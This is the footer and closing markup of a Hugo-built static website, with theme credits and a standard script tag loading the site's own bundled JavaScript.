            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>



    </body>
</html>
